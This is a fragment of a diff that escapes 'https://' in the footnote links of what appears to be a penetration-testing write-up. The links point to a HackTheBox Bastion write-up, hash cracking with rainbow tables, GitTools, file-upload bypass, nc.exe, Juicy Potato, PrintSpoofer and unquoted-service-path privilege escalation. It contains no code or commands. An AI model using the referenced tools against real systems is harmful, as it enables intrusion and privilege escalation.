-[[7]](#ftnt_ref7) [https://0xd4y.github.io/Writeups/HackTheBox/Bastion%20Writeup.pdf](https://www.google.com/url?q=https://0xd4y.github.io/Writeups/HackTheBox/Bastion%2520Writeup.pdf&sa=D&source=editors&ust=1653838005062635&usg=AOvVaw2eiFI282lB5D35Qvi1kVWp) 
+[[7]](#ftnt_ref7) [https\://0xd4y.github.io/Writeups/HackTheBox/Bastion%20Writeup.pdf](https\://www.google.com/url?q=https\://0xd4y.github.io/Writeups/HackTheBox/Bastion%2520Writeup.pdf&sa=D&source=editors&ust=1653838005062635&usg=AOvVaw2eiFI282lB5D35Qvi1kVWp) 
 
 [[8]](#ftnt_ref8) This website can be particularly fast in cracking unsalted hashes because it uses a rainbow table.
 
-[[9]](#ftnt_ref9) [https://www.youtube.com/watch?v=cBXdoIuLzmA&ab_channel=1ENews](https://www.google.com/url?q=https://www.youtube.com/watch?v%3DcBXdoIuLzmA%26ab_channel%3D1ENews&sa=D&source=editors&ust=1653838005065786&usg=AOvVaw2xvlbqH8ur7pPaWul1POR_) 
+[[9]](#ftnt_ref9) [https\://www.youtube.com/watch?v=cBXdoIuLzmA&ab_channel=1ENews](https\://www.google.com/url?q=https\://www.youtube.com/watch?v%3DcBXdoIuLzmA%26ab_channel%3D1ENews&sa=D&source=editors&ust=1653838005065786&usg=AOvVaw2xvlbqH8ur7pPaWul1POR_) 
 
-[[10]](#ftnt_ref10) [https://github.com/internetwache/GitTools](https://www.google.com/url?q=https://github.com/internetwache/GitTools&sa=D&source=editors&ust=1653838005063071&usg=AOvVaw2v_rlJrB5CPABViiQLRKZr) 
+[[10]](#ftnt_ref10) [https\://github.com/internetwache/GitTools](https\://www.google.com/url?q=https\://github.com/internetwache/GitTools&sa=D&source=editors&ust=1653838005063071&usg=AOvVaw2v_rlJrB5CPABViiQLRKZr) 
 
-[[11]](#ftnt_ref11) [https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](https://www.google.com/url?q=https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass&sa=D&source=editors&ust=1653838005066154&usg=AOvVaw3w9rGIC3kJf1w9z5f71Ytl) 
+[[11]](#ftnt_ref11) [https\://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](https\://www.google.com/url?q=https\://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass&sa=D&source=editors&ust=1653838005066154&usg=AOvVaw3w9rGIC3kJf1w9z5f71Ytl) 
 
-[[12]](#ftnt_ref12) [https://github.com/int0x33/nc.exe/](https://www.google.com/url?q=https://github.com/int0x33/nc.exe/&sa=D&source=editors&ust=1653838005063359&usg=AOvVaw3NofcJRUjfD6nVHziPfG-q) 
+[[12]](#ftnt_ref12) [https\://github.com/int0x33/nc.exe/](https\://www.google.com/url?q=https\://github.com/int0x33/nc.exe/&sa=D&source=editors&ust=1653838005063359&usg=AOvVaw3NofcJRUjfD6nVHziPfG-q) 
 
-[[13]](#ftnt_ref13) [https://github.com/ohpe/juicy-potato](https://www.google.com/url?q=https://github.com/ohpe/juicy-potato&sa=D&source=editors&ust=1653838005064199&usg=AOvVaw2mPFls3Vr-VzWdZG425UGe) 
+[[13]](#ftnt_ref13) [https\://github.com/ohpe/juicy-potato](https\://www.google.com/url?q=https\://github.com/ohpe/juicy-potato&sa=D&source=editors&ust=1653838005064199&usg=AOvVaw2mPFls3Vr-VzWdZG425UGe) 
 
-[[14]](#ftnt_ref14) [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://www.google.com/url?q=https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&sa=D&source=editors&ust=1653838005064536&usg=AOvVaw0AjfjNj-tZevtcorBOD0DA) 
+[[14]](#ftnt_ref14) [https\://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https\://www.google.com/url?q=https\://itm4n.github.io/printspoofer-abusing-impersonate-privileges/&sa=D&source=editors&ust=1653838005064536&usg=AOvVaw0AjfjNj-tZevtcorBOD0DA) 
 
-[[15]](#ftnt_ref15) [https://gracefulsecurity.com/privesc-unquoted-service-path](https://www.google.com/url?q=https://gracefulsecurity.com/privesc-unquoted-service-path/&sa=D&source=editors&ust=1653838005063660&usg=AOvVaw0DdEf-CeK185wTCSxHtlwI)[/](https://www.google.com/url?q=https://gracefulsecurity.com/privesc-unquoted-service-path/&sa=D&source=editors&ust=1653838005063901&usg=AOvVaw20TNnhc78C282ymnFw8HLG)
+[[15]](#ftnt_ref15) [https\://gracefulsecurity.com/privesc-unquoted-service-path](https\://www.google.com/url?q=https\://gracefulsecurity.com/privesc-unquoted-service-path/&sa=D&source=editors&ust=1653838005063660&usg=AOvVaw0DdEf-CeK185wTCSxHtlwI)[/](https\://www.google.com/url?q=https\://gracefulsecurity.com/privesc-unquoted-service-path/&sa=D&source=editors&ust=1653838005063901&usg=AOvVaw20TNnhc78C282ymnFw8HLG)
